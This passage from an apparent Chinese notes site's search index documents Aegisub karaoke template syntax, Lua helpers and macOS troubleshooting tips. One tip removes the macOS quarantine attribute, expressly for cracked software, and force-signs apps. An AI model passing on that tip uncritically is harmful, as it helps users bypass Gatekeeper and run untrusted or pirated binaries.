\u540e\uff0c\u8868\u793a\u8fd9\u4e2a\u4ee3\u7801\u5728\u811a\u672c\u8fd0\u884c\u65f6\u53ea\u6267\u884c\u4e00\u6b21\uff0c\u4e14\u6700\u5148\u6267\u884c\u3002 line name <p>code line \u8868\u793a\u6bcf\u884c\u90fd\u4f1a\u6267\u884c\u8fd9\u4e2a\u4ee3\u7801\u3002</p> <p>template line \u8868\u793a\u6a21\u677f\u4f5c\u7528\u5728\u884c\u4e0a\uff0c\u5373\u4e00\u884c k \u8f74\u751f\u6210\u4e00\u884c fx \u8f74\uff0c\u5176\u4e2d\u7684 \\k \u6807\u7b7e\u88ab\u66ff\u6362\u4e3a\u6a21\u677f\u5185\u5bb9\u3002template line \u540e\u53ef\u52a0\u4e00\u4e2a name\uff0c\u5e26\u6709\u76f8\u540c name \u7684\u884c\u6a21\u677f\u4f1a\u62fc\u5230\u4e00\u8d77\u4f5c\u7528\u3002</p> Example Effect Text template line A template line B karaoke {\\k56}a{\\k55}b fx AaAb fx BaBb Effect Text template line a A template line a B karaoke {\\k56}a{\\k55}b fx ABaABb pre-line name <p>\u53ea\u80fd\u7528\u5728 template \u4e0a\uff0c\u4f1a\u5728\u6bcf\u4e2a\u539f\u59cb\u5b57\u5e55\u884c\u524d\u52a0\u4e0a\u6a21\u677f\u5185\u5bb9\u3002\u5982\u679c\u6709\u6307\u5b9a name \u5219\u914d\u5408\u5bf9\u5e94 name \u7684 template line \u4e00\u8d77\u4f7f\u7528\u3002</p> Example Effect Text template pre-line C karaoke {\\k56}a{\\k55}b fx Cab Effect Text template pre-line a C template line a A karaoke {\\k56}a{\\k55}b fx CAaAb syl <p>code syl \u8868\u793a\u6bcf\u4e2a\u97f3\u8282\u90fd\u4f1a\u6267\u884c\u4e00\u6b21\u4ee3\u7801\u3002</p> <p>template syl \u8868\u793a\u9488\u5bf9\u6bcf\u4e2a\u97f3\u8282\u751f\u6210\u65b0\u7684\u4e00\u884c\uff0c\u5c06\u97f3\u8282\u524d\u7684 \\k \u6807\u7b7e\u66ff\u6362\u4e3a\u6a21\u677f\u5185\u5bb9\u4e5f\u653e\u5728\u751f\u6210\u884c\u7684\u5f00\u5934\u3002</p> Example Effect Text template syl A karaoke {\\k56}a{\\k55}b fx A fx Aa fx Ab <p>\u53ef\u4ee5\u6ce8\u610f\u5230\u6709\u4e00\u884c\u53ea\u6709 A\uff0c\u8fd9\u662f\u5f00\u5934\u7684\u7a7a\u97f3\u8282\u751f\u6210\u7684\uff0c\u540e\u9762\u4f1a\u8bb2\u5230\u53ef\u4ee5\u901a\u8fc7 noblank \u4fee\u9970\u8bed\u5220\u6389\u3002</p> all code \u548c template \u90fd\u53ef\u7528\uff0c\u8868\u793a\u5728\u7b5b\u9009\u5339\u914d\u7684\u5b57\u5e55\u884c\u65f6\u65e0\u89c6\u6837\u5f0f\uff0c\u5373\u628a\u7279\u6548\u6a21\u677f\u7528\u5728\u6240\u6709\u884c\u4e0a\uff08\u800c\u4e0d\u4ec5\u662f\u76f8\u540c\u6837\u5f0f\u7684\u884c\u4e0a\uff09\u3002 char \u4e00\u822c\u7528\u4e8e template\uff0c\u8868\u793a\u6bcf\u4e2a\u5b57\u7b26\u751f\u6210\u4e00\u4e2a\u65b0\u884c\uff0c\u5e76\u5728\u5f00\u5934\u6dfb\u52a0\u6a21\u677f\u5185\u5bb9\u3002template syl char \u548c template char \u6548\u679c\u4e00\u6837\u3002 fx name <p>\u7528\u4e8e template syl\uff0c\u53ea\u5728\u5339\u914d\u5230\u5185\u8054\u7279\u6548 name \u7684\u65f6\u5019\u5e94\u7528\u6a21\u677f\u3002</p> <p>\u5185\u8054\u7279\u6548\u4e3a \\-name \u8fd9\u4e2a\u65e0\u5b9e\u9645\u4f5c\u7528\u7684\u7279\u6548\u6807\u7b7e\u3002\u4e14\u5bf9\u540e\u7eed\u6240\u6709\u97f3\u8282\u90fd\u4f1a\u4ea7\u751f\u6548\u679c\u3002</p> Example Effect Text template syl fx name A karaoke {\\k56}a{\\k55\\-name}b{\\k55}c fx Ab fx Ac fxgroup name <p>\u7528\u4e8e template syl\uff0c\u9700\u8981\u914d\u5408 code \u884c\u6765\u8bbe\u7f6e fxgroup\uff0c\u4ee5\u5b9e\u73b0\u6761\u4ef6\u5224\u65ad\u3002</p> Example Effect Text code syl fxgroup.group = (syl.duration &gt; 1000) template syl fxgroup group A karaoke {\\k56}a{\\k55}b{\\k200}c fx Ac keeptags <p>\u7528\u4e8e\u4fdd\u7559\u539f\u6709\u7684\u989d\u5916\u6807\u7b7e\u3002</p> Example Effect Text template line keeptags A karaoke {\\k56}a{\\k55\\fs100}b{\\k55}c fx AaA{\\fs100}bAc <p>\u5982\u679c\u4e0d\u52a0 keeptags \u5219 \\fs \u4f1a\u6d88\u5931\u3002\u5982\u679c\u7528\u5728 template syl \u4e0a\uff0c\u5219 \\fs \u53ea\u4fdd\u7559\u4e00\u4e2a\u97f3\u8282\u800c\u4e0d\u4f1a\u52a0\u5728\u540e\u7eed\u6240\u6709\u4e0a\u3002</p> multi <p>\u65e5\u8bed\u4e2d\u4e00\u4e2a\u6c49\u5b57\u53ef\u80fd\u6709\u591a\u4e2a\u97f3\u8282\uff0c\u5982\u679c\u8981\u4e3a\u6b64\u521b\u5efa\u591a\u6b21\u6548\u679c\u5219\u9700\u8981\u7528 multi\uff0c\u591a\u7684\u97f3\u8282\u5185\u5bb9\u7528 # \u5360\u4f4d\u3002</p> Example Effect Text template syl multi A karaoke {\\k56}a{\\k55}#{\\k55}b fx A fx Aa fx Aa fx Ab noblank \u4e0d\u5bf9\u7a7a\u97f3\u8282\u8d77\u4f5c\u7528\u3002 notext <p>\u7528\u5728 template \u4e0a\uff0c\u751f\u6210\u7684\u65b0\u5185\u5bb9\u4e0d\u4f1a\u5305\u542b\u539f\u5b57\u5e55\u884c\u4e2d\u7684\u6587\u672c\u3002</p> Example Effect Text template line notext A karaoke {\\k56}a{\\k55}b fx AA repeat n / loop n \u5c06\u6a21\u677f\u91cd\u590d\u6267\u884c n \u6b21\u3002"},{"location":"others/subs/aegisub/karaoke/#_4","title":"\u5185\u8054\u53d8\u91cf","text":"<p>\u6211\u4eec\u7684\u76ee\u7684\u662f\u5c06 \\k \u66ff\u6362\u4e3a\u66f4\u6709\u610f\u4e49\u7684\u6807\u7b7e\uff0c\u6bd4\u5982 \\t \u7684\u52a8\u753b\uff0c\u90a3\u8fd9\u91cc\u5c31\u9700\u8981\u65f6\u95f4\u4fe1\u606f\uff0c\u6240\u4ee5\u6a21\u677f\u7684\u6267\u884c\u73af\u5883\u63d0\u4f9b\u4e86\u5185\u8054\u53d8\u91cf\u4f9b\u4f7f\u7528\u3002\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u7528 !! \u5305\u88f9\u91cc\u9762\u5199 lua \u8868\u8fbe\u5f0f\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u4f1a\u653e\u56de\u5230\u539f\u4f4d\u7f6e\u3002</p> <ul> <li>\u884c\u53d8\u91cf<ul> <li>\u5b57\u5e55\u884c\u5c5e\u6027\uff1a$layer $style $actor\uff08\u8bf4\u8bdd\u4eba\uff09$margin_l ..._r/v/t/b $li\uff08\u884c\u53f7\uff09</li> <li>\u65f6\u95f4\u4fe1\u606f\uff1a$lstart $lend $ldur $lmid\uff0c\u5747\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff0c\u7edd\u5bf9\u65f6\u95f4</li> <li>\u4f4d\u7f6e\u4fe1\u606f\uff1a$lx $ly $lleft $lright $lcenter $ltop $lmiddle $lbottom $lwidth $lheight</li> <li>\u97f3\u8282\u4fe1\u606f\uff1a$syln\uff0c\u5373\u884c\u5185\u97f3\u8282\u4e2a\u6570</li> </ul> </li> <li>\u97f3\u8282\u53d8\u91cf<ul> <li>\u65f6\u95f4\u4fe1\u606f\uff1a$sstart $send $sdur $smid\uff0c\u5747\u4ee5\u6beb\u79d2\u4e3a\u5355\u4f4d\uff0c\u76f8\u5bf9\u4e8e\u884c\u5f00\u59cb\u7684\u65f6\u95f4<ul> <li>$skdur \u4ee5\u5398\u79d2\u4e3a\u5355\u4f4d\uff08\\k \u540e\u7684\u539f\u503c\uff09</li> </ul> </li> <li>\u4f4d\u7f6e\u4fe1\u606f\uff1a$sx $sy $sleft $sright $scenter $stop $smiddle $sbottom $swidth $sheight</li> <li>\u97f3\u8282\u4fe1\u606f\uff1a$si\uff0c\u5373\u5728\u884c\u5185\u662f\u7b2c\u51e0\u4e2a\u97f3\u8282</li> </ul> </li> </ul> <p>\u65f6\u95f4\u548c\u4f4d\u7f6e\u4fe1\u606f\u662f\u53ef\u9002\u5e94\u7684\uff0c\u5373\u4e0d\u5199\u5f00\u5934\u7684 l \u548c s\uff0c\u5728 pre-line \u4e2d\u4e3a\u884c\u53d8\u91cf\uff0c\u5176\u5b83\u60c5\u51b5\u4e3a\u97f3\u8282\u53d8\u91cf\u3002</p> <p>\u7528\u6cd5\u6bd4\u5982 template syl \u8981\u4fdd\u6301\u5404\u97f3\u8282\u4f4d\u7f6e\u7684\u8bdd\uff0c\u6a21\u677f\u91cc\u8981\u5199 {\\pos($x,$y)}\u3002\u65f6\u95f4\u4fe1\u606f\u53ef\u4ee5\u7528\u5728 \\t \u6807\u7b7e\u91cc\u3002</p> Aegisub \u5b98\u65b9\u6587\u6863\u4e2d\u7684\u793a\u4f8b <p>\u4e00\u4e2a template line \u884c\u6a21\u677f\uff0c\u5185\u5bb9\uff1a</p> <pre><code>{\\r\\k$kdur\\t($start,$end,\\1c&amp;H00FF00&amp;)\\t($start,!$start+$dur*0.3!,\\fscy120)\\t(!$start+$dur*0.3!,$end,\\fscy100)}\n</code></pre> <ul> <li><code>\\r</code>\uff1a\u91cd\u7f6e\u6837\u5f0f\uff0c\u6446\u8131\u524d\u9762\u6807\u7b7e\u7684\u5f71\u54cd</li> <li><code>\\k$kdur</code>\uff1a\u4fdd\u7559 \\k \u6807\u7b7e\uff0c\u5373\u4fdd\u4e3b\u6b21\u989c\u8272\u4e0a\u8272\u7684\u6548\u679c</li> <li><code>\\t($start,$end,\\1c&amp;H00FF00&amp;)</code>\uff1a\u4ece\u97f3\u8282\u5f00\u59cb\u5230\u7ed3\u5c3e\u6e10\u53d8\u4e0a\u7eff\u8272</li> <li><code>\\t($start,!$start+$dur*0.3!,\\fscy120)</code>\uff1a\u4ece\u97f3\u8282\u5f00\u5934\u6301\u7eed\u97f3\u8282\u957f\u5ea6\u7684 30%\uff0c\u5448\u73b0\u62c9\u9ad8 20% \u7684\u52a8\u753b</li> <li><code>\\t(!$start+$dur*0.3!,$end,\\fscy100)</code>\uff1a\u5269\u4e0b\u7684 70% \u65f6\u95f4\u5185\u5c06\u9ad8\u5ea6\u53d8\u56de\u539f\u6837</li> </ul>"},{"location":"others/subs/aegisub/karaoke/#_5","title":"\u4ee3\u7801\u6267\u884c\u73af\u5883","text":"<p>\u5373 template \u4e2d\u5185\u8054\u53d8\u91cf/\u5185\u8054 Lua \u8868\u8fbe\u5f0f\uff0c\u4ee5\u53ca code \u4ee3\u7801\u5728\u6267\u884c\u65f6\u80fd\u63a5\u89e6\u5230\u7684\u73af\u5883\u3002</p> <p>\u8fd9\u90e8\u5206\u611f\u89c9\u8fd8\u662f\u76f4\u63a5\u770b kara-templater \u4ee3\u7801\u66f4\u6e05\u6670\u3002\u8fd9\u4e24\u4e2a\u7279\u6548\u6a21\u677f\u5206\u522b\u901a\u8fc7 run_text_template run_code_template \u51fd\u6570\u6267\u884c\u3002</p> run_text_template(template, tenv, varctx) <p>template \u5c31\u662f\u6a21\u677f\u884c\u5185\u5bb9\uff0ctenv varctx \u662f\u4e24\u4e2a\u8868\uff0c\u5206\u522b\u8bb0\u5f55\u4e86\u4ee3\u7801\u8fd0\u884c\u73af\u5883\u548c\u5185\u8054\u53d8\u91cf\u503c\uff0c\u6267\u884c\u8fc7\u7a0b\u5927\u6982\u662f\uff1a</p> <ul> <li>\u5339\u914d $ \u5f00\u5934\u7684\u5185\u8054\u53d8\u91cf\uff0c\u901a\u8fc7 varctx \u8868\u67e5\u627e\u5e76\u7528\u503c\u66ff\u4ee3</li> <li>\u5339\u914d !! \u4e2d\u7684\u5185\u5bb9\uff0c\u8bbe\u7f6e\u6267\u884c\u73af\u5883\u4e3a tenv\uff0c\u518d\u8c03\u7528 pcall\uff0c\u5c06\u7ed3\u679c\u66ff\u4ee3\u56de\u53bb</li> </ul> run_code_template(template, tenv) \u540c\u4e0a\uff0c\u76f4\u63a5\u4f7f\u7528 tenv \u73af\u5883 pcall \u4ee3\u7801\u5185\u5bb9\u3002 <p>\u53ef\u89c1\u4e3b\u8981\u73af\u5883\u6709 tenv varctx \u4e24\u4e2a\u3002\u800c varctx \u5c31\u662f\u524d\u9762\u63d0\u5230\u7684\u5185\u8054\u53d8\u91cf\uff0c\u6240\u4ee5\u4e0d\u5fc5\u591a\u8bf4\uff0c\u90a3\u63a5\u4e0b\u6765\u8981\u5173\u6ce8\u7684\u5c31\u662f tenv\u3002</p> <p>tenv \u4f1a\u5728 apply_templates \u5f00\u5934\u8fdb\u884c\u5168\u5c40\u53ef\u8bbf\u95ee\u6a21\u5757\u7684\u8bbe\u7f6e\u4ee5\u53ca\u4e00\u4e9b\u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u7136\u540e\u5728 apply_templates \u540e\u9762\u904d\u5386\u5339\u914d\u884c\uff0c\u5bf9\u5339\u914d\u5230\u7684\u884c\u8c03\u7528 apply_line \u51fd\u6570\u3002apply_line \u51fd\u6570\u4e2d\u4f1a\u8bbe\u7f6e\u4e00\u4e9b\u9488\u5bf9\u5f53\u524d\u884c\u6216\u8005\u97f3\u8282\u7684\u53d8\u91cf\u3002</p> <p>\u4ece\u7b80\u5355\u7684\u6765\u770b\uff0c\u884c\u548c\u97f3\u8282\u53d8\u91cf\uff1a</p> <ul> <li>line\uff1a\u5f53\u524d\u5904\u7406\u7684\u884c\uff0c\u548c\u81ea\u52a8\u5316\u4e2d subtitles API \u4e2d\u7684 line \u4e00\u6837\uff0c\u4f46\u4f1a\u591a\u4e00\u4e9b\u5176\u4ed6\u53c2\u6570\uff0c\u53ef\u4ee5\u4fee\u6539</li> <li>orgline\uff1a\u539f\u59cb\u884c</li> <li>syl\uff1a\u5f53\u524d\u5904\u7406\u7684\u97f3\u8282</li> <li>basesyl\uff1achar \u548c multi \u4fee\u9970\u8bed\u4e0b\u4e3a\u539f\u97f3\u8282\uff0c\u5426\u5219\u548c syl \u4e00\u6837</li> <li>meta\uff1a\u811a\u672c\u5143\u6570\u636e\uff0c\u5373 [Script Info] \u5185\u5bb9\uff0c\u5305\u542b res_x res_y</li> </ul> <p>line \u548c syl \u662f\u7ecf\u8fc7\u4e86 karaskel.lua \u4e2d\u7684\u4e00\u7cfb\u5217\u5904\u7406\u51fd\u6570\u5904\u7406\u8fc7\u7684\uff0c\u4f1a\u591a\u5f88\u591a\u5c5e\u6027\uff0c\u8fd9\u90e8\u5206\u8fd8\u662f\u53c2\u8003\u5b98\u65b9\u6587\u6863\u4e2d karaskel.lua \u7684\u90e8\u5206\u3002</p> <p>\u63a5\u4e0b\u6765\u770b\u53ef\u5168\u5c40\u8bbf\u95ee\u7684\u6a21\u5757\uff0c\u5373 apply_templates \u5f00\u5934\u7684\u4ee3\u7801\uff1a</p> <pre><code>local tenv = {\n    meta = meta,\n    string = string,\n    math = math,\n    _G = _G\n}\ntenv.tenv = tenv\n</code></pre> <p>\u5373 string math \u4e24\u4e2a\u5e38\u7528\u7684\u6807\u51c6\u5e93\u76f4\u63a5\u52a0\u8f7d\u8fdb\u53bb\u4e86\u3002\u5269\u4e0b _G \u8868\u793a\u5168\u5c40\u53d8\u91cf\uff08\u7c7b\u4f3c python globals()\uff09\uff0c\u53ef\u4ee5\u901a\u8fc7 _G.xxx \u8bbf\u95ee\u66f4\u591a\u6807\u51c6\u5e93\u6216\u8005 Aegisub \u7684\u5e93\uff0c\u6bd4\u5982\u53ef\u4ee5\u8c03\u7528 _G.util.interpolate_color \u6765\u751f\u6210\u63d2\u503c\u6e10\u53d8\u8272\u3002\u8fd8\u6709\u4e00\u4e2a tenv \u8868\u793a\u81ea\u5df1\u3002</p> <p>\u63a5\u4e0b\u6765 apply_templates \u51fd\u6570\u4e2d\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\uff0c\u53ef\u4ee5\u5728 template \u548c code \u4e2d\u4f7f\u7528\uff0c\u5b9a\u4e49\u65b9\u6cd5\u5927\u6982\u662f\uff1a</p> <pre><code>tenv.retime = function(mode, addstart, addend)\n    ...\nend\n</code></pre> retime(mode, addstart, addend) <p>\u6bd4\u8f83\u91cd\u8981\u4e14\u5e38\u7528\u7684\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u6765\u4fee\u6539\u751f\u6210\u884c\u7684\u65f6\u95f4\u3002mode \u63d0\u4f9b\u4e00\u4e2a start \u548c end \u7684\u57fa\u51c6\uff0c\u518d\u5206\u522b\u52a0\u4e0a addstart addend \u4f5c\u4e3a\u65b0\u7684\u884c\u65f6\u95f4\u3002\u6709\u4ee5\u4e0b mode\uff1a</p> <ul> <li>set \u6216 abs\uff1a\u76f4\u63a5\u8bbe\u7f6e\u884c\u65f6\u95f4\u4e3a addstart addend</li> <li>syl\uff1a\u97f3\u8282\u7684\u8d77\u6b62\u65f6\u95f4\u4e3a\u57fa\u51c6</li> <li>presyl\uff1a\u57fa\u51c6\u8d77\u6b62\u65f6\u95f4\u90fd\u662f\u97f3\u8282\u7684\u5f00\u59cb\u65f6\u95f4</li> <li>postsyl\uff1a\u57fa\u51c6\u8d77\u6b62\u65f6\u95f4\u90fd\u662f\u97f3\u8282\u7684\u7ed3\u675f\u65f6\u95f4</li> <li>line\uff1a\u884c\u7684\u8d77\u6b62\u65f6\u95f4\u4e3a\u57fa\u51c6</li> <li>preline\uff1a\u57fa\u51c6\u8d77\u6b62\u65f6\u95f4\u90fd\u662f\u884c\u7684\u5f00\u59cb\u65f6\u95f4</li> <li>postline\uff1a\u57fa\u51c6\u8d77\u6b62\u65f6\u95f4\u90fd\u662f\u884c\u7684\u7ed3\u675f\u65f6\u95f4</li> <li>start2syl\uff1a\u57fa\u51c6\u8d77\u59cb\u65f6\u95f4\u4e3a\u884c\u7684\u5f00\u59cb\u65f6\u95f4\uff0c\u7ed3\u675f\u65f6\u95f4\u4e3a\u97f3\u8282\u7684\u5f00\u59cb\u65f6\u95f4</li> <li>syl2end\uff1a\u57fa\u51c6\u8d77\u59cb\u65f6\u95f4\u4e3a\u97f3\u8282\u7684\u7ed3\u675f\u65f6\u95f4\uff0c\u7ed3\u675f\u65f6\u95f4\u4e3a\u884c\u7684\u7ed3\u675f\u65f6\u95f4</li> <li>sylpct\uff1a\u57fa\u51c6\u8d77\u6b62\u65f6\u95f4\u90fd\u662f\u97f3\u8282\u7684\u5f00\u59cb\u65f6\u95f4\uff0c\u4f46\u52a0\u7684\u65f6\u95f4\u662f addstart*syl.duration/100\uff08addend \u540c\u7406\uff09\u800c\u4e0d\u662f addstart</li> </ul> Example <p>\u6bd4\u5982\u5c06 template line \u7684\u5185\u5bb9\u8bbe\u4e3a\u4ee5\u4e0b\u53ef\u4ee5\u5ef6\u957f\u884c\u7684\u5f00\u59cb\u548c\u7ed3\u5c3e\u65f6\u95f4\u5404 100ms \u5e76\u9644\u52a0\u5176\u4ed6\u6548\u679c\uff1a</p> <pre><code>!retime(\"line\", -100, 100)!{...}\n</code></pre> relayer(layer) \u5c06\u751f\u6210\u884c\u7684\u5c42\u8bbe\u4e3a layer\u3002 restyle(style) \u5c06\u751f\u6210\u884c\u7684\u6837\u5f0f\u8bbe\u4e3a style\u3002\u6ce8\u610f\u4fee\u6539\u540e\u4e0d\u4f1a\u66f4\u65b0\u5185\u8054\u7684\u4f4d\u7f6e\u53d8\u91cf\u3002 maxloop(maxj) / maxloops(maxj) <p>\u8bbe\u7f6e template \u6267\u884c\u7684\u6700\u591a\u5faa\u73af\u6b21\u6570\u3002</p> <p>tenv.j \u4e3a\u5f53\u524d\u8fdb\u884c\u4e86\u51e0\u6b21\u5faa\u73af\uff0ctenv.maxj \u4e3a\u6700\u591a\u8fdb\u884c\u51e0\u6b21\u5faa\u73af\u505c\u6b62\u3002\u5c1d\u8bd5\u8fdb\u884c\u7684\u5faa\u73af\u6b21\u6570\u5c31\u662f\u4fee\u9970\u8bed\u4e2d\u7684 loop n\u3002</p> loopctl(j, maxj) \u540c\u65f6\u63a7\u5236\u5faa\u73af\u4e2d\u7684 j \u548c maxj\uff0c\u5f88\u5c11\u7528\u3002 remember(name, value) \u5c06 value \u8fd9\u4e2a\u503c\u5b58\u50a8\u4e3a name\uff0c\u53ef\u4ee5\u5728\u540e\u9762\u7684 template \u4e2d\u901a\u8fc7 recall \u51fd\u6570\u6765\u5f97\u5230\u4fdd\u5b58\u7684\u503c\u3002\u4e14\u8fd4\u56de value \u672c\u8eab\uff0c\u56e0\u6b64\u53ef\u4ee5\u76f4\u63a5\u5957\u5728\u88f8\u503c\u4e0a\u4f7f\u7528\u3002\u5728\u4fdd\u5b58\u968f\u673a\u503c\u65f6\u5e38\u7528\u3002 remember_if(name, value, condition) \u5957\u4e00\u5c42 if\uff0c\u53ea\u6709 condition \u6210\u7acb\u65f6\u8bb0\u5f55\u503c\u3002 recall(name, default) <p>\u8fd4\u56de\u4fdd\u5b58\u7684\u503c\uff0c\u6ca1\u6709\u4fdd\u5b58\u5219\u8fd4\u56de default\u3002</p> Aegisub \u5b98\u65b9\u6587\u6863\u4e2d\u7684\u793a\u4f8b <pre><code>template syl,{\\frz!remember(\"entryrotation\",math.random(100,200))!\\fscx300\\fscy300\\t(0,300,\\frz0\\fscx100\\fscy100)\\pos($x,$y)}\ntemplate syl,{\\frz-!recall(\"entryrotation\")!\\fscx300\\fscy300\\t(0,300,\\frz0\\fscx100\\fscy100)\\pos($x,$y)\\fad(300,0)}\n</code></pre> <p>\u5373\u901a\u8fc7 math.random \u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\u5e76\u8bb0\u5f55\u4e3a entryrotation\uff0c\u7136\u540e\u5728\u540e\u9762\u7684 template \u4e2d\u901a\u8fc7 recall \u6765\u83b7\u5f97\u540c\u4e00\u4e2a\u503c\u3002</p>"},{"location":"others/troubleshooting/","title":"TroubleShooting","text":"<p>Abstract</p> <p>\u5b58\u6863\u4e00\u4e9b\u89e3\u51b3\u8fc7\u7684\u7591\u96be\u6742\u75c7\uff0c\u65b9\u4fbf\u4ee5\u540e\u518d\u6b21\u51fa\u73b0\u7684\u65f6\u5019\u67e5\u9605</p>"},{"location":"others/troubleshooting/#table-of-contents","title":"Table of Contents","text":"<ul> <li>macOS \u5e73\u53f0\u95ee\u9898</li> </ul>"},{"location":"others/troubleshooting/mac/","title":"macOS TroubleShooting","text":"<p> \u7ea6 658 \u4e2a\u5b57  5 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u5728 macOS \u4e0a\u9047\u5230\u8fc7\u7684\u4e00\u4e9b\u95ee\u9898\u548c\u89e3\u51b3\u65b9\u6cd5</p>"},{"location":"others/troubleshooting/mac/#_1","title":"\u6709\u5173\u8f6f\u4ef6","text":""},{"location":"others/troubleshooting/mac/#_2","title":"\u8f6f\u4ef6\u65e0\u6cd5\u6253\u5f00","text":"<p>Warning</p> <p>\u8fd9\u90e8\u5206\u53ef\u80fd\u6709\u4e9b\u4e71\u5957\uff0c\u56e0\u4e3a\u662f\u56de\u5fc6\u51fa\u6765\u7684</p> <ul> <li>\u65e0\u6cd5\u8ba4\u8bc1\u5f00\u53d1\u8005<ul> <li>\u76f4\u63a5\u901a\u8fc7\u8bbf\u8fbe\u53f3\u952e\u6253\u5f00\u8f6f\u4ef6\uff0c\u7b2c\u4e8c\u6b21\u5c31\u53ef\u4ee5\u5f3a\u5236\u6253\u5f00\uff0c\u540e\u7eed\u90fd\u53ef\u4ee5\u6b63\u5e38\u6253\u5f00</li> <li>\u5f3a\u5236\u7b7e\u540d <code>codesign --sign - --force --deep /Applications/&lt;app&gt;.app</code></li> </ul> </li> <li>\u5df2\u635f\u574f<ul> <li>\u5bf9\u4e8e\u5305\u542b\u7834\u89e3\u7684\u8f6f\u4ef6\u7b49\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u5df2\u635f\u574f\u7684\u60c5\u51b5\uff0c\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u6e05\u9664\u8f6f\u4ef6\u9694\u79bb\u5c5e\u6027\u6765\u89e3\u51b3 <code>sudo xattr -r -d com.apple.quarantine /Applications/&lt;app&gt;.app</code></li> </ul> </li> <li>\u65e0\u6cd5\u6253\u5f00\u8f6f\u4ef6<ul> <li>\u4ece\u7f51\u4e0a\u76f4\u63a5\u4e0b\u8f7d\u7684 .app \u53ef\u80fd\u76f4\u63a5\u53cc\u51fb\u6216\u8005\u53f3\u952e\u90fd\u6253\u4e0d\u5f00\uff0c\u547d\u4ee4\u884c open \u7684\u8bdd\u663e\u793a\u4ee5\u4e0b\u4fe1\u606f     <pre><code>The application cannot be opened for an unexpected reason, error=Error Domain=RBSRequestErrorDomain Code=5 \"Launch failed.\" UserInfo={NSLocalizedFailureReason=Launch failed., NSUnderlyingError=0x600000f6d470 {Error Domain=NSPOSIXErrorDomain Code=111 \"Unknown error: 111\" UserInfo={NSLocalizedDescription=Launchd job spawn failed}}}\n</code></pre></li> <li>\u539f\u56e0\u53ef\u80fd\u662f .app \u7684\u6743\u9650\u8bbe\u7f6e\u4e0d\u6b63\u786e\uff08\u4f8b\u5982\u591a\u4e86\u5199\u6743\u9650\u7b49\uff09\uff0c<code>sudo chmod -R 755 /Applications/&lt;app&gt;.app</code> \u5373\u53ef\u89e3\u51b3</li> </ul> </li> </ul>"},{"location":"others/troubleshooting/mac/#gcc-12-_stdioh","title":"gcc-12 \u627e\u4e0d\u5230 _stdio.h","text":"<p>macOS \u4e2d\u7684 gcc \u547d\u4ee4\u5b9e\u9645\u4e0a\u662f clang \u7684 alias\uff0c\u4f7f\u7528 gcc \u7684\u8bdd\u8981\u901a\u8fc7 gcc-12 \u547d\u4ee4\u3002\u5728 macOS \u6216 XCode \u66f4\u65b0\u540e\u4f7f\u7528 gcc-12 \u7f16\u8bd1\u53ef\u80fd\u4f1a\u51fa\u73b0\u4ee5\u4e0b\u62a5\u9519\uff1a <pre><code>/usr/local/Cellar/gcc/12.2.0/lib/gcc/current/gcc/x86_64-apple-darwin21/12/include-fixed/stdio.h:78:10: fatal error: _stdio.h: No such file or directory\n   78 | #include &lt;_stdio.h&gt;\n      |          ^~~~~~~~~~\ncompilation terminated.\n</code></pre> \u8fd9\u65f6\u9700\u8981\u91cd\u65b0\u5b89\u88c5\u4e00\u4e0b XCode \u547d\u4ee4\u884c\u5de5\u5177\u5305\uff1a<code>xcode-select --install</code>\u3002</p> <p>Note</p> <p>\u8fd9\u4e2a Command Line Developer Tools \u5728\u5b89\u88c5\u7684\u65f6\u5019\u9884\u8ba1\u65f6\u95f4\u4f30\u8ba1\u662f\u4e0d\u51c6\u7684\uff0c\u521a\u5f00\u59cb\u7684\u65f6\u5019\u9884\u8ba1 200+ \u5c0f\u65f6\u5b8c\u6210\u662f\u6b63\u5e38\u7684\u3002</p>"},{"location":"others/troubleshooting/mac/#_3","title":"\u6709\u5173\u7f51\u7edc","text":""},{"location":"others/troubleshooting/mac/#192","title":"\u7ec8\u7aef\u4e3b\u673a\u540d\u663e\u793a\u4e3a 192","text":"<p>\u53c2\u8003\uff1ahttps://www.jianshu.com/p/8febc2993687</p> <p>\u5f53\u8def\u7531\u5668\u7684 DNS \u4f7f\u7528\u9ed8\u8ba4\u7684 192.168.1.1 \u6216 192.168.0.1 \u7684\u65f6\u5019\u8ba1\u7b97\u673a\u540d\u4f1a\u53d8\u6210 192\uff0c\u5f53\u8def\u7531\u5668\u7684 DNS \u4f7f\u7528\u81ea\u5b9a\u4e49\u7684\u7684\u65f6\u5019\u8ba1\u7b97\u673a\u540d\u624d\u4f1a\u53d8\u6210\u8bbe\u7f6e\u7684\u540d\u5b57\u3002</p> <p>\u53ef\u4ee5\u5728\u5f53\u524d\u8fde\u63a5 wifi \u8bbe\u7f6e\u7684 DNS \u4e00\u9879\u5c06\u65b0\u589e\u4e00\u4e2a 8.8.8.8 \u5373\u53ef\u89e3\u51b3\u3002</p>"},{"location":"others/troubleshooting/mac/#_4","title":"\u6709\u5173\u78c1\u76d8","text":""},{"location":"others/troubleshooting/mac/#_5","title":"\u79fb\u52a8\u786c\u76d8\u5f02\u5e38\u9000\u51fa\u65e0\u6cd5\u518d\u6b21\u6302\u8f7d","text":"<p>\u5927\u6982\u5c31\u662f\u79fb\u52a8\u786c\u76d8\u7a81\u7136\u65ad\u8fde\uff0c\u7136\u540e\u91cd\u65b0\u63d2\u5165\u7684\u65f6\u5019\u770b\u4e0d\u5230\u78c1\u76d8\u3002\u5728\u7cfb\u7edf\u78c1\u76d8\u5de5\u5177\u91cc\u53ef\u4ee5\u770b\u5230\u4e00\u5757\u672a\u88c5\u8f7d\u7684\u78c1\u76d8\uff08<code>diskutil list</code> \u4e5f\u53ef\u4ee5\u770b\u5230\uff09\uff0c\u4f46\u662f\u65e0\u6cd5\u6302\u8f7d\uff08com.apple.DiskManagement.disenter \u9519\u8bef 0\uff09\u3002</p> <p>\u89e3\u51b3\u65b9\u6848\u6765\u81ea https://www.xiaocrab.net/post/macos-exfat-diskmanagementdisenter-error-0/</p> <p>\u9996\u5148 <code>ps aux | grep 